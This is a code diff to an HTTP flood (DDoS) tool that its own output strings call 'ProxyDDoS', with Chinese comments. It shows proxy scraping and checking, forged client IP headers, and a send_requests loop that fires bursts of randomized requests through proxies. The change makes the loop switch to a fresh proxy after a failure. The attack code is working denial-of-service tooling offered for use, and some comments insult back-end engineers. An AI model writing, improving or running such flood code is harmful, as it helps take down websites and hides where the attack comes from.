@@ -118,9 +118,8 @@ def check_proxy(proxy): # 檢測proxy的TCP connection跟HTTP REQUESTS
     proxy_port = int(proxy_port)
 
     s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.set_proxy(socks.HTTP, proxy_ip, proxy_port)
-    s.settimeout(2)
+    s.settimeout(1)
 
     try:
         s.connect((host, port))
@@ -129,7 +128,7 @@ def check_proxy(proxy): # 檢測proxy的TCP connection跟HTTP REQUESTS
             context.check_hostname = False
             context.verify_mode = ssl.CERT_NONE
             s = context.wrap_socket(s, server_hostname=host)
-        s.send(f"HEAD / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode('utf-8'))
+        s.send(f"HEAD / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
 
         with lock:
             conns += 1
@@ -191,7 +190,7 @@ def GetReferer():
 def fakeIP(): #假IP 專幹那些低能後端工程師
     ip = ""
     for _ in range(4):
-        ip += f".{random.randint(0,254)}"
+        ip += f".{random.randint(1,254)}"
         # 別懷疑 就是會有低能白癡後端 覺得後台看到的IP會是真的 
         # 這邊觀念宣導, 資料庫抓到的ip 不管從哪個標頭抓的 全部都是可以偽造的
         # X-forwarded-For, Client-IP, Via 等等 數不清的標頭 IP全部都可以偽造
@@ -306,7 +305,6 @@ def ProxyScraper(): # 抓取proxy的 , 用了無數次 可以肯定的說 50~70k
             if len(lines) > 10 and len(lines) < 22:
                 download_proxy.append(lines)
 
-
     print("Start Get Github Proxies")
     for u in git_proxy_list:
         host = u.split(".com/")[1]
@@ -364,12 +362,15 @@ def send_requests(): #傳統HTTP FLOOD
                 for _ in range(100):
                     s.send(f"{method} {path}?{rC(string)}={rInt(1,99999)}{rC(rand)} HTTP/1.1\r\nHost: {host}\r\n{header}".encode('utf-8'))
                 print(f"[ProxyDDoS]->Stress \033[36m{host}\033[0m From: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
-                s.close()
             except:
                 print(f"[ProxyDDoS]->Proxy: \033[35;1m{proxy_ip}:{proxy_port}\033[0m request \033[31;1mFailed\033[0m")
                 s.close()
+                proxy_ip, proxy_port = random.choice(good_proxies).split(":")
+                proxy_port = int(proxy_port)
         except:
             s.close()
+            proxy_ip, proxy_port = random.choice(good_proxies).split(":")
+            proxy_port = int(proxy_port)
 
 
 if __name__ == '__main__':
